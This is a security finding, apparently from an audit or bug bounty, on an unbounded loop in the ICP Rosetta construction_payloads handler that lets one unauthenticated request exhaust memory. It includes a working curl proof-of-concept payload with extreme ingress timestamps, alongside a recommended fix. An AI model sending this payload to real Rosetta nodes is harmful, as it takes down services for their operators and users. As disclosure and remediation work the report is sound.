### Title
Unbounded `ingress_expiries` Loop in ICP Rosetta `construction_payloads` Causes OOM Process Crash — (`rs/rosetta-api/icp/src/request_handler/construction_payloads.rs`)

---

### Summary

The ICP Rosetta handler's `construction_payloads` function contains an unbounded `while` loop that iterates from `ingress_start` to `ingress_end` in ~120-second steps, pushing a `u64` into a `Vec` on every iteration. An unauthenticated HTTP client can supply `ingress_start=0` and `ingress_end=u64::MAX` (or any far-future timestamp), causing the Rosetta process to allocate hundreds of gigabytes of memory and terminate with OOM. The ICRC1 Rosetta handler has explicit guards for this case; the ICP handler has none.

---

### Finding Description

**Vulnerable loop** — `construction_payloads.rs` lines 99–107:

```rust
let mut ingress_expiries = vec![];
let mut now = ingress_start;
while now < ingress_end {
    let ingress_expiry = (now
        + ic_limits::MAX_INGRESS_TTL.saturating_sub(ic_limits::PERMITTED_DRIFT))
    .as_nanos_since_unix_epoch();
    ingress_expiries.push(ingress_expiry);
    now += interval;
}
``` [1](#0-0) 

The step size `interval` is computed as:

```
interval = MAX_INGRESS_TTL - PERMITTED_DRIFT - 120s
         = 5 min - 1 min - 2 min = 120 seconds = 120_000_000_000 ns
``` [2](#0-1) 

`ingress_start` and `ingress_end` are taken directly from the client-supplied JSON metadata with no range validation:

```rust
let ingress_start = meta.as_ref()
    .and_then(|meta| meta.ingress_start)
    .map(ic_types::time::Time::from_nanos_since_unix_epoch)
    .unwrap_or_else(ic_types::time::current_time);

let ingress_end = meta.as_ref()
    .and_then(|meta| meta.ingress_end)
    .map(ic_types::time::Time::from_nanos_since_unix_epoch)
    .unwrap_or_else(|| ingress_start + interval);
``` [3](#0-2) 

`ConstructionPayloadsRequestMetadata::try_from` is a plain `serde_json::from_value` with no numeric bounds checking: [4](#0-3) 

**Contrast with ICRC1 Rosetta**, which explicitly rejects oversized windows before entering its equivalent loop:

```rust
if ingress_start >= ingress_end {
    return Err(...);
}
if ingress_end < now + ingress_interval {
    return Err(...);
}
``` [5](#0-4) 

The ICP handler has no analogous guard.

---

### Impact Explanation

With `ingress_start = 0` and `ingress_end = u64::MAX` (≈ 1.84 × 10¹⁹ ns):

- **Iterations** = `u64::MAX / 120_000_000_000` ≈ **153 billion**
- **Memory** = 153 × 10⁹ × 8 bytes ≈ **~1.2 TB** (Vec of `u64`)

Even a modest `ingress_end` of year 2100 in nanoseconds (~4.1 × 10¹⁸ ns from epoch) yields ~34 billion iterations and ~270 GB of allocation — far beyond any realistic server RAM. The Rosetta process is killed by the OS OOM killer. This is a single-request, non-volumetric denial of service against the ICP Rosetta node.

---

### Likelihood Explanation

The `/construction/payloads` endpoint is a public, unauthenticated HTTP POST endpoint. No credentials, tokens, or privileged access are required. The attacker needs only to craft a valid JSON body with `metadata.ingress_start` and `metadata.ingress_end` set to extreme values. The exploit is deterministic and reproducible with a single request.

---

### Recommendation

Add an upper-bound guard on the ingress window before entering the loop, mirroring the ICRC1 handler pattern. For example:

```rust
const MAX_INGRESS_WINDOW: Duration = Duration::from_secs(24 * 60 * 60); // 24 hours
if ingress_end > ingress_start + MAX_INGRESS_WINDOW {
    return Err(ApiError::invalid_request(
        "ingress_end exceeds maximum allowed ingress window"
    ));
}
```

Alternatively, cap `ingress_expiries` to a fixed maximum count (e.g., 720 entries for a 24-hour window at 2-minute intervals) and return an error if the requested window would exceed it.

---

### Proof of Concept

```bash
curl -X POST http://<rosetta-host>:8080/construction/payloads \
  -H 'Content-Type: application/json' \
  -d '{
    "network_identifier": {"blockchain":"Internet Computer","network":"00000000000000020101"},
    "operations": [
      {"operation_identifier":{"index":0},"type":"TRANSACTION","account":{"address":"<valid_account>"},"amount":{"value":"-100000000","currency":{"symbol":"ICP","decimals":8}}},
      {"operation_identifier":{"index":1},"type":"TRANSACTION","account":{"address":"<valid_dst>"},"amount":{"value":"100000000","currency":{"symbol":"ICP","decimals":8}}}
    ],
    "public_keys": [{"hex_bytes":"<valid_pubkey>","curve_type":"edwards25519"}],
    "metadata": {
      "ingress_start": 0,
      "ingress_end": 18446744073709551615
    }
  }'
```

Expected: the Rosetta process enters the loop at line 101, allocates memory unboundedly, and is terminated by OOM before returning a response. Process liveness check immediately after the request will show the process is dead.

### Citations

**File:** rs/rosetta-api/icp/src/request_handler/construction_payloads.rs (L59-60)
```rust
        let interval =
            ic_limits::MAX_INGRESS_TTL - ic_limits::PERMITTED_DRIFT - Duration::from_secs(120);
```

**File:** rs/rosetta-api/icp/src/request_handler/construction_payloads.rs (L74-84)
```rust
        let ingress_start = meta
            .as_ref()
            .and_then(|meta| meta.ingress_start)
            .map(ic_types::time::Time::from_nanos_since_unix_epoch)
            .unwrap_or_else(ic_types::time::current_time);

        let ingress_end = meta
            .as_ref()
            .and_then(|meta| meta.ingress_end)
            .map(ic_types::time::Time::from_nanos_since_unix_epoch)
            .unwrap_or_else(|| ingress_start + interval);
```

**File:** rs/rosetta-api/icp/src/request_handler/construction_payloads.rs (L99-107)
```rust
        let mut ingress_expiries = vec![];
        let mut now = ingress_start;
        while now < ingress_end {
            let ingress_expiry = (now
                + ic_limits::MAX_INGRESS_TTL.saturating_sub(ic_limits::PERMITTED_DRIFT))
            .as_nanos_since_unix_epoch();
            ingress_expiries.push(ingress_expiry);
            now += interval;
        }
```

**File:** rs/rosetta-api/icp/src/models.rs (L240-248)
```rust
impl TryFrom<ObjectMap> for ConstructionPayloadsRequestMetadata {
    type Error = ApiError;
    fn try_from(o: ObjectMap) -> Result<Self, ApiError> {
        serde_json::from_value(serde_json::Value::Object(o)).map_err(|e| {
            ApiError::internal_error(format!(
                "Could not parse ConstructionPayloadsRequestMetadata from Object: {e}"
            ))
        })
    }
```

**File:** rs/rosetta-api/icrc1/src/construction_api/services.rs (L148-158)
```rust
    if ingress_start >= ingress_end {
        return Err(Error::processing_construction_failed(&format!(
            "Ingress start should start before ingress end: Start: {ingress_start}, End: {ingress_end}"
        )));
    }

    if ingress_end < now + ingress_interval {
        return Err(Error::processing_construction_failed(&format!(
            "Ingress end should be at least one interval from the current time: Current time: {now}, End: {ingress_end}"
        )));
    }
```
